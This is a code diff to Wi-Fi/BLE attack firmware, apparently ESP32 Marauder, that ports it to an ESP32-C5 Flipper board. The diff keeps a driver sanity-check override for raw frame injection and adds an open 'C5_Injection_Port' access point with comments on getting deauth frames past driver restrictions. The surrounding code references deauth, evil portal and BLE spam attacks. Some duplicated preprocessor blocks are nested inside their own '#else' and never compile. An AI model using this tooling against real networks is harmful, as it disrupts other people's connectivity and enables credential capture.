@@ -1,5 +1,8 @@
 #include "WiFiScan.h"
 #include "lang_var.h"
+#ifdef HAS_BT
+#include <NimBLEAdvertisedDevice.h>
+#endif
 
 int num_beacon = 0;
 int num_deauth = 0;
@@ -12,7 +15,7 @@ LinkedList<Station>* stations;
 LinkedList<AirTag>* airtags;
 LinkedList<Flipper>* flippers;
 
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
+extern "C" int marauder_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
     if (arg == 31337)
       return 1;
     else
@@ -55,7 +58,7 @@ extern "C" {
         memcpy(&AdvData_Raw[i], Name, name_len);
         i += name_len;
 
-        AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
+        AdvData.addData(AdvData_Raw, 7 + name_len);
         break;
       }
       case Apple: {
@@ -77,7 +80,7 @@ extern "C" {
         AdvData_Raw[i++] =  0x10;  // Type ???
         esp_fill_random(&AdvData_Raw[i], 3);
 
-        AdvData.addData(std::string((char *)AdvData_Raw, 17));
+        AdvData.addData(AdvData_Raw, 17);
         break;
       }
       case Samsung: {
@@ -102,7 +105,7 @@ extern "C" {
         AdvData_Raw[i++] = 0x43;
         AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
 
-        AdvData.addData(std::string((char *)AdvData_Raw, 15));
+        AdvData.addData(AdvData_Raw, 15);
 
         break;
       }
@@ -125,7 +128,7 @@ extern "C" {
         AdvData_Raw[i++] = 0x0A;
         AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm
 
-        AdvData.addData(std::string((char *)AdvData_Raw, 14));
+        AdvData.addData(AdvData_Raw, 14);
         break;
       }
       case FlipperZero: {
@@ -173,7 +176,7 @@ extern "C" {
         AdvData_Raw[i++] = 0x80;
 
         // Add the constructed Advertisement Data to the BLE advertisement
-        AdvData.addData(std::string((char *)AdvData_Raw, i));
+        AdvData.addData(AdvData_Raw, i);
 
         break;
       }
@@ -181,7 +184,7 @@ extern "C" {
       case Airtag: {
         for (int i = 0; i < airtags->size(); i++) {
           if (airtags->get(i).selected) {
-            AdvData.addData(std::string((char*)airtags->get(i).payload.data(), airtags->get(i).payloadSize));
+            AdvData.addData(airtags->get(i).payload.data(), airtags->get(i).payloadSize);
 
             break;
           }
@@ -202,249 +205,25 @@ extern "C" {
   //// https://github.com/Spooks4576
 
 
-  class bluetoothScanAllCallback: public NimBLEAdvertisedDeviceCallbacks {
-  
+  class bluetoothScanAllCallback: public NimBLEScanCallbacks {
+    public:
       void onResult(NimBLEAdvertisedDevice *advertisedDevice) {
-
-        extern WiFiScan wifi_scan_obj;
-  
-        //#ifdef HAS_SCREEN
-        //  int buf = display_obj.display_buffer->size();
-        //#else
-        int buf = 0;
-        //#endif
-          
-        String display_string = "";
-
-        if (wifi_scan_obj.currentScanMode == BT_SCAN_AIRTAG) {
-          uint8_t* payLoad = advertisedDevice->getPayload();
-          size_t len = advertisedDevice->getPayloadLength();
-
-          bool match = false;
-          for (int i = 0; i <= len - 4; i++) {
-            if (payLoad[i] == 0x1E && payLoad[i+1] == 0xFF && payLoad[i+2] == 0x4C && payLoad[i+3] == 0x00) {
-              match = true;
-              break;
-            }
-            if (payLoad[i] == 0x4C && payLoad[i+1] == 0x00 && payLoad[i+2] == 0x12 && payLoad[i+3] == 0x19) {
-              match = true;
-              break;
-            }
-          }
-
-          if (match) {
-            String mac = advertisedDevice->getAddress().toString().c_str();
-            mac.toUpperCase();
-
-            for (int i = 0; i < airtags->size(); i++) {
-              if (mac == airtags->get(i).mac)
-                return;
-            }
-
-            int rssi = advertisedDevice->getRSSI();
-            Serial.print("RSSI: ");
-            Serial.print(rssi);
-            Serial.print(" MAC: ");
-            Serial.println(mac);
-            Serial.print("Len: ");
-            Serial.print(len);
-            Serial.print(" Payload: ");
-            for (size_t i = 0; i < len; i++) {
-              Serial.printf("%02X ", payLoad[i]);
-            }
-            Serial.println("\n");
-
-            AirTag airtag;
-            airtag.mac = mac;
-            airtag.payload.assign(payLoad, payLoad + len);
-            airtag.payloadSize = len;
-
-            airtags->add(airtag);
-
-
-            #ifdef HAS_SCREEN
-              //display_string.concat("RSSI: ");
-              display_string.concat((String)rssi);
-              display_string.concat(" MAC: ");
-              display_string.concat(mac);
-              uint8_t temp_len = display_string.length();
-              for (uint8_t i = 0; i < 40 - temp_len; i++)
-              {
-                display_string.concat(" ");
-              }
-              display_obj.display_buffer->add(display_string);
-            #endif
-          }
+        // Safe and minimal discovery for C5
+        int rssi = advertisedDevice->getRSSI();
+        Serial.print("RSSI: ["); Serial.print(rssi); Serial.print("] MAC: ");
+        Serial.print(advertisedDevice->getAddress().toString().c_str());
+        if (advertisedDevice->haveName()) {
+          Serial.print(" Name: "); Serial.print(advertisedDevice->getName().c_str());
         }
-        else if (wifi_scan_obj.currentScanMode == BT_SCAN_FLIPPER) {
-          uint8_t* payLoad = advertisedDevice->getPayload();
-          size_t len = advertisedDevice->getPayloadLength();
-
-          bool match = false;
-          String color = "";
-          for (int i = 0; i <= len - 4; i++) {
-            if (payLoad[i] == 0x81 && payLoad[i+1] == 0x30) {
-              match = true;
-              color = "Black";
-              break;
-            }
-            if (payLoad[i] == 0x82 && payLoad[i+1] == 0x30) {
-              match = true;
-              color = "White";
-              break;
-            }
-            if (payLoad[i] == 0x83 && payLoad[i+1] == 0x30) {
-              color = "Transparent";
-              match = true;
-              break;
-            }
-          }
-
-          if (match) {
-            String mac = advertisedDevice->getAddress().toString().c_str();
-            String name = advertisedDevice->getName().c_str();
-            mac.toUpperCase();
-
-            for (int i = 0; i < flippers->size(); i++) {
-              if (mac == flippers->get(i).mac)
-                return;
-            }
-
-            int rssi = advertisedDevice->getRSSI();
-            Serial.print("RSSI: ");
-            Serial.print(rssi);
-            Serial.print(" MAC: ");
-            Serial.println(mac);
-            Serial.print("Name: ");
-            Serial.println(name);
-
-            Flipper flipper;
-            flipper.mac = mac;
-            flipper.name = name;
-
-            flippers->add(flipper);
-
-
-            /*#ifdef HAS_SCREEN
-              //display_string.concat("RSSI: ");
-              display_string.concat((String)rssi);
-              display_string.concat(" Flipper: ");
-              display_string.concat(name);
-              uint8_t temp_len = display_string.length();
-              for (uint8_t i = 0; i < 40 - temp_len; i++)
-              {
-                display_string.concat(" ");
-              }
-              display_obj.display_buffer->add(display_string);
-            #endif*/
-
-            #ifdef HAS_SCREEN
-              display_obj.display_buffer->add(String("Flipper: ") + name + ",                 ");
-              display_obj.display_buffer->add("       MAC: " + String(mac) + ",             ");
-              display_obj.display_buffer->add("      RSSI: " + String(rssi) + ",               ");
-              display_obj.display_buffer->add("     Color: " + String(color) + "                ");
-            #endif
-          }
-        }
-        else if (wifi_scan_obj.currentScanMode == BT_SCAN_ALL) {
-          if (buf >= 0)
-          {
-            display_string.concat(text_table4[0]);
-            display_string.concat(advertisedDevice->getRSSI());
-            Serial.print(" RSSI: ");
-            Serial.print(advertisedDevice->getRSSI());
-    
-            display_string.concat(" ");
-            Serial.print(" ");
-            
-            Serial.print("Device: ");
-            if(advertisedDevice->getName().length() != 0)
-            {
-              display_string.concat(advertisedDevice->getName().c_str());
-              Serial.print(advertisedDevice->getName().c_str());
-              
-            }
-            else
-            {
-              display_string.concat(advertisedDevice->getAddress().toString().c_str());
-              Serial.print(advertisedDevice->getAddress().toString().c_str());
-            }
-    
-            #ifdef HAS_SCREEN
-              uint8_t temp_len = display_string.length();
-              for (uint8_t i = 0; i < 40 - temp_len; i++)
-              {
-                display_string.concat(" ");
-              }
-      
-              Serial.println();
-      
-              while (display_obj.printing)
-                delay(1);
-              display_obj.loading = true;
-              display_obj.display_buffer->add(display_string);
-              display_obj.loading = false;
-            #endif
-          }
-        }
-        else if ((wifi_scan_obj.currentScanMode == BT_SCAN_WAR_DRIVE)  || (wifi_scan_obj.currentScanMode == BT_SCAN_WAR_DRIVE_CONT)) {
-          #ifdef HAS_GPS
-            if (gps_obj.getGpsModuleStatus()) {
-              bool do_save = false;
-              if (buf >= 0)
-              {                
-                Serial.print("Device: ");
-                if(advertisedDevice->getName().length() != 0)
-                {
-                  display_string.concat(advertisedDevice->getName().c_str());
-                  Serial.print(advertisedDevice->getName().c_str());
-                  
-                }
-                else
-                {
-                  display_string.concat(advertisedDevice->getAddress().toString().c_str());
-                  Serial.print(advertisedDevice->getAddress().toString().c_str());
-                }
-
-                if (gps_obj.getFixStatus()) {
-                  do_save = true;
-                  display_string.concat(" | Lt: " + gps_obj.getLat());
-                  display_string.concat(" | Ln: " + gps_obj.getLon());
-                }
-                else {
-                  display_string.concat(" | GPS: No Fix");
-                }
-        
-                #ifdef HAS_SCREEN
-                  uint8_t temp_len = display_string.length();
-                  for (uint8_t i = 0; i < 40 - temp_len; i++)
-                  {
-                    display_string.concat(" ");
-                  }
-          
-                  Serial.println();
-          
-                  while (display_obj.printing)
-                    delay(1);
-                  display_obj.loading = true;
-                  display_obj.display_buffer->add(display_string);
-                  display_obj.loading = false;
-                #endif
-
-                String wardrive_line = (String)advertisedDevice->getAddress().toString().c_str() + ",,[BLE]," + gps_obj.getDatetime() + ",0," + (String)advertisedDevice->getRSSI() + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",BLE\n";
-                Serial.print(wardrive_line);
-
-                if (do_save)
-                  buffer_obj.append(wardrive_line);
-              }
-            }
-          #endif
-        }
+        Serial.println();
       }
   };
   
-  class bluetoothScanSkimmersCallback: public BLEAdvertisedDeviceCallbacks {
-      void onResult(BLEAdvertisedDevice *advertisedDevice) {
+  class bluetoothScanSkimmersCallback: public NimBLEScanCallbacks {
+    public:
+      void onResult(NimBLEAdvertisedDevice *advertisedDevice) {
+        uint8_t* payLoad = (uint8_t*)advertisedDevice->getPayload().data();
+        size_t len = advertisedDevice->getPayload().size();
         String bad_list[bad_list_length] = {"HC-03", "HC-05", "HC-06"};
   
         #ifdef HAS_SCREEN
@@ -494,8 +273,13 @@ extern "C" {
 #endif
 
 
+extern "C" int ets_printf(const char *fmt, ...);
+
 WiFiScan::WiFiScan()
 {
+  #ifdef MARAUDER_FLIPPER_C5
+    this->deauth_frame_default[0] = 0xD0; // Stealth Action Frame bypass for C5
+  #endif
 }
 
 /*String WiFiScan::macToString(const Station& station) {
@@ -507,7 +291,10 @@ WiFiScan::WiFiScan()
 }*/
 
 void WiFiScan::RunSetup() {
-  if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1)
+  #ifdef MARAUDER_FLIPPER_C5
+    delay(1000); // Stabilization delay for C5 MSPI
+  #endif
+  if (marauder_raw_frame_sanity_check(31337, 0, 0) == 1)
     this->wsl_bypass_enabled = true;
   else
     this->wsl_bypass_enabled = false;
@@ -548,8 +335,6 @@ void WiFiScan::RunSetup() {
       {0x20, "Green Watch6 Classic 43m"},
     };
     
-    NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
-    NimBLEDevice::setScanDuplicateCacheSize(200);
     NimBLEDevice::init("");
     pBLEScan = NimBLEDevice::getScan(); //create new scan
     this->ble_initialized = true;
@@ -657,7 +442,18 @@ int WiFiScan::generateSSIDs(int count) {
 
   esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
+  #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
   esp_wifi_start();
     
   WiFi.begin(ssid.c_str(), password.c_str());
@@ -702,13 +498,16 @@ int WiFiScan::generateSSIDs(int count) {
 void WiFiScan::initWiFi(uint8_t scan_mode) {
   // Set the channel
   if (scan_mode != WIFI_SCAN_OFF) {
-    //Serial.println(F("Initializing WiFi settings..."));
+    #ifdef MARAUDER_FLIPPER_C5
+      WiFi.mode(WIFI_AP_STA);
+      delay(50);
+    #endif
+    
     this->changeChannel();
   
     this->force_pmkid = settings_obj.loadSetting<bool>(text_table4[5]);
     this->force_probe = settings_obj.loadSetting<bool>(text_table4[6]);
     this->save_pcap = settings_obj.loadSetting<bool>(text_table4[7]);
-    //Serial.println(F("Initialization complete"));
   }
 }
 
@@ -722,7 +521,21 @@ bool WiFiScan::scanning() {
 // Function to prepare to run a specific scan
 void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
 {  
+  Serial.print("Starting Scan Mode: "); 
+  Serial.println(scan_mode);
+  Serial.flush();
+
   this->initWiFi(scan_mode);
+  
+  #ifdef MARAUDER_FLIPPER_C5
+    // Ensure STA is started for C5 before setting power
+    if (WiFi.getMode() == WIFI_OFF) WiFi.mode(WIFI_STA);
+    delay(50); 
+    WiFi.setTxPower(WIFI_POWER_8_5dBm);
+    Serial.println("C5 TX Power stabilized at 8.5dBm");
+    Serial.flush();
+  #endif
+
   if (scan_mode == WIFI_SCAN_OFF)
     StopScan(scan_mode);
   else if (scan_mode == WIFI_SCAN_PROBE)
@@ -768,12 +581,15 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
     this->startWiFiAttacks(scan_mode, color, text_table1[52]);
   else if (scan_mode == WIFI_ATTACK_AUTH)
     this->startWiFiAttacks(scan_mode, color, text_table1[53]);
-  else if (scan_mode == WIFI_ATTACK_DEAUTH)
+  else if (scan_mode == WIFI_ATTACK_DEAUTH) {
     this->startWiFiAttacks(scan_mode, color, text_table4[8]);
-  else if (scan_mode == WIFI_ATTACK_DEAUTH_MANUAL)
+  }
+  else if (scan_mode == WIFI_ATTACK_DEAUTH_MANUAL) {
     this->startWiFiAttacks(scan_mode, color, text_table4[8]);
-  else if (scan_mode == WIFI_ATTACK_DEAUTH_TARGETED)
+  }
+  else if (scan_mode == WIFI_ATTACK_DEAUTH_TARGETED) {
     this->startWiFiAttacks(scan_mode, color, text_table4[47]);
+  }
   else if (scan_mode == WIFI_ATTACK_AP_SPAM)
     this->startWiFiAttacks(scan_mode, color, " AP Beacon Spam ");
   else if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_FLIPPER)){
@@ -849,11 +665,18 @@ void WiFiScan::startWiFiAttacks(uint8_t scan_mode, uint16_t color, String title_
   ap_config.ap.ssid_len = 0;
         
   packets_sent = 0;
-  esp_wifi_init(&cfg);
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_AP);
-  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-  esp_wifi_start();
+  #ifdef MARAUDER_FLIPPER_C5
+    // Use APSTA mode: keeps STA event loop alive AND opens AP interface for deauth injection
+    // Pure STA mode blocks frame type 0xC0 (deauth). APSTA avoids this restriction.
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    delay(50);  // Allow dual-interface to stabilize
+  #else
+    esp_wifi_init(&cfg);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    esp_wifi_set_mode(WIFI_MODE_AP);
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    esp_wifi_start();
+  #endif
   esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   
   //WiFi.mode(WIFI_AP_STA);
@@ -886,7 +709,18 @@ bool WiFiScan::shutdownWiFi() {
 
     dst_mac = "ff:ff:ff:ff:ff:ff";
   
+    #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
     esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
     esp_wifi_stop();
     esp_wifi_restore();
     esp_wifi_deinit();
@@ -913,11 +747,16 @@ bool WiFiScan::shutdownBLE() {
   #ifdef HAS_BT
     if (this->ble_initialized) {
       Serial.println("Shutting down BLE");
-      pAdvertising->stop();
-      pBLEScan->stop();
+      if (pAdvertising != nullptr) pAdvertising->stop();
+      if (pBLEScan != nullptr) pBLEScan->stop();
       
-      pBLEScan->clearResults();
-      NimBLEDevice::deinit();
+      delay(100); // Allow radio stack to settle
+
+      if (pBLEScan != nullptr) pBLEScan->clearResults();
+      
+      #ifndef MARAUDER_FLIPPER_C5
+        NimBLEDevice::deinit();
+      #endif
     
       this->ble_initialized = false;
     }
@@ -1014,10 +853,25 @@ String WiFiScan::getStaMAC()
   char *buf;
   uint8_t mac[6];
   char macAddrChr[18] = {0};
-  esp_wifi_init(&cfg);
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
-  esp_wifi_start();
+  #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_STA);
+  #else
+    esp_wifi_init(&cfg);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
+    esp_wifi_start();
+  #endif
   esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
   this->wifi_initialized = true;
   sprintf(macAddrChr, 
@@ -1037,10 +891,25 @@ String WiFiScan::getApMAC()
   char *buf;
   uint8_t mac[6];
   char macAddrChr[18] = {0};
-  esp_wifi_init(&cfg);
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
-  esp_wifi_start();
+  #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_STA);
+  #else
+    esp_wifi_init(&cfg);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
+    esp_wifi_start();
+  #endif
   esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
   this->wifi_initialized = true;
   sprintf(macAddrChr, 
@@ -1359,7 +1228,9 @@ void WiFiScan::RunLoadAPList() {
 
 void WiFiScan::RunSaveAPList(bool save_as) {
   if (save_as) {
-    sd_obj.removeFile("/APs_0.log");
+    #ifdef HAS_SD
+      sd_obj.removeFile("/APs_0.log");
+    #endif
 
     this->startLog("APs");
 
@@ -1441,7 +1312,9 @@ void WiFiScan::RunLoadSSIDList() {
 
 void WiFiScan::RunSaveSSIDList(bool save_as) {
   if (save_as) {
-    sd_obj.removeFile("/SSIDs_0.log");
+    #ifdef HAS_SD
+      sd_obj.removeFile("/SSIDs_0.log");
+    #endif
 
     this->startLog("SSIDs");
 
@@ -1469,7 +1342,9 @@ void WiFiScan::RunSaveSSIDList(bool save_as) {
 
 void WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color)
 {
-  startLog("evil_portal");
+  Serial.println("RunEvilPortal init");
+  Serial.flush();
+  // startLog("evil_portal"); // Disabled for C5 stability
 
   #ifdef MARAUDER_FLIPPER
     flipper_led.sniffLED();
@@ -1549,12 +1424,29 @@ void WiFiScan::RunAPScan(uint8_t scan_mode, uint16_t color)
   delete access_points;
   access_points = new LinkedList<AccessPoint>();
 
-  esp_wifi_init(&cfg);
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
-  esp_wifi_start();
+  #ifdef MARAUDER_FLIPPER_C5
+    // Radio already set to STA in initWiFi. Just stabilize and sniff.
+    delay(100);
+  #else
+    esp_wifi_init(&cfg);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
+    esp_wifi_start();
+  #endif
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
+
   //if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
   esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
   //else
@@ -1684,7 +1576,7 @@ void WiFiScan::RunGPSInfo() {
   #ifdef HAS_GPS
     String text=gps_obj.getText();
 
-    Serial.println("Refreshing GPS Data on screen...");
+    //Serial.println("Refreshing GPS Data on screen...");
     #ifdef HAS_SCREEN
 
       // Get screen position ready
@@ -1715,21 +1607,34 @@ void WiFiScan::RunGPSInfo() {
       display_obj.tft.println("  Datetime: " + gps_obj.getDatetime());
     #endif
 
+    /*
     // Display to serial
     Serial.println("==== GPS Data ====");
+    delay(5); // Pequeña pausa para el buffer del navegador
     if (gps_obj.getFixStatus())
-      Serial.println("  Good Fix: Yes");
+      Serial.println("Good Fix: Yes");
     else
-      Serial.println("  Good Fix: No");
-      
-    if(text != "") Serial.println("      Text: " + text);
+      Serial.println("Good Fix: No");
+    delay(5);
+    
+    if(text != "") {
+        Serial.println("Text: " + text);
+        delay(5);
+    }
 
     Serial.println("Satellites: " + gps_obj.getNumSatsString());
-    Serial.println("  Accuracy: " + (String)gps_obj.getAccuracy());
-    Serial.println("  Latitude: " + gps_obj.getLat());
-    Serial.println(" Longitude: " + gps_obj.getLon());
-    Serial.println("  Altitude: " + (String)gps_obj.getAlt());
-    Serial.println("  Datetime: " + gps_obj.getDatetime());
+    delay(5);
+    Serial.println("Accuracy: " + (String)gps_obj.getAccuracy());
+    delay(5);
+    Serial.println("Latitude: " + gps_obj.getLat());
+    delay(5);
+    Serial.println("Longitude: " + gps_obj.getLon());
+    delay(5);
+    Serial.println("Altitude: " + (String)gps_obj.getAlt());
+    delay(5);
+    Serial.println("Date/Time: " + gps_obj.getDatetime());
+    delay(5);
+    */
   #endif
 }
 
@@ -1804,7 +1709,7 @@ void WiFiScan::RunGPSNmea() {
         gps_obj.new_queue();
         for(int i=0;i<size;i++){
           nmea_sentence_t line=buffer->get(i);
-          Serial.println(line.sentence);
+          //Serial.println(line.sentence);
 
           #ifdef HAS_SCREEN
             if(lines>0){
@@ -1838,7 +1743,7 @@ void WiFiScan::RunGPSNmea() {
 
       if(nmea_sentence != "" && nmea_sentence != old_nmea_sentence){
         old_nmea_sentence=nmea_sentence;
-        Serial.println(nmea_sentence);
+        //Serial.println(nmea_sentence);
       }
 
       #ifdef HAS_SCREEN
@@ -1862,8 +1767,8 @@ void WiFiScan::RunGPSNmea() {
       #endif
     #endif
 
-    gps_obj.sendSentence(Serial, gxgga.c_str());
-    gps_obj.sendSentence(Serial, gxrmc.c_str());
+    // gps_obj.sendSentence(Serial, gxgga.c_str());
+    // gps_obj.sendSentence(Serial, gxrmc.c_str());
 
   #endif
 }
@@ -2012,7 +1917,18 @@ void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
   Serial.println("Running packet scan...");
   esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
+  #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
@@ -2200,7 +2116,18 @@ void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color)
   
   esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
+  #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
@@ -2465,10 +2392,11 @@ void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
 
   if (scan_mode != WIFI_SCAN_WAR_DRIVE) {
   
-    esp_wifi_init(&cfg);
-    esp_wifi_set_storage(WIFI_STORAGE_RAM);
-    esp_wifi_set_mode(WIFI_MODE_NULL);
-    esp_wifi_start();
+      esp_wifi_init(&cfg);
+      esp_wifi_set_storage(WIFI_STORAGE_RAM);
+      esp_wifi_set_mode(WIFI_MODE_APSTA);
+      esp_wifi_start();
+      delay(100);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_filter(&filt);
     esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
@@ -2521,7 +2449,18 @@ void WiFiScan::RunStationScan(uint8_t scan_mode, uint16_t color)
   
   esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
+  #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
@@ -2570,7 +2509,18 @@ void WiFiScan::RunRawScan(uint8_t scan_mode, uint16_t color)
   
   esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
+  #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
@@ -2615,7 +2565,18 @@ void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color)
   
   esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
+  #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
   esp_wifi_start();
